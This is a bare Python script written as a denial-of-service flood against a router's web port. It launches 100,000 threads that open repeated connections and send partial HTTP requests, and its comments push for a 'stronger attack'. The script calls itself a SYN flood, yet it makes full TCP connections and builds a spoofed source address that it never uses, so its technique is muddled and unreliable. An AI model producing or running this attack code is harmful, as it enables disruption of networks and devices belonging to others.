import socket
import random
import threading

# Target IP and Port (Router's IP)
target_ip = "192.168.1.1"
target_port = 80  # Typically HTTP port

# Function to create TCP connection and flood
def syn_flood():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(1)
    while True:
        # Random source IP
        source_ip = str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255)) + "." + str(random.randint(1, 255))
        try:
            sock.connect((target_ip, target_port))
            sock.sendto(b"GET / HTTP/1.1\r\n", (target_ip, target_port))
        except socket.error:
            pass

# Create multiple threads to simulate a large flood
threads = []

for i in range(100000):  # Increase the number of threads for stronger attack
    thread = threading.Thread(target=syn_flood)
    threads.append(thread)
    thread.start()

# Wait for threads to finish
for t in threads:
    t.join()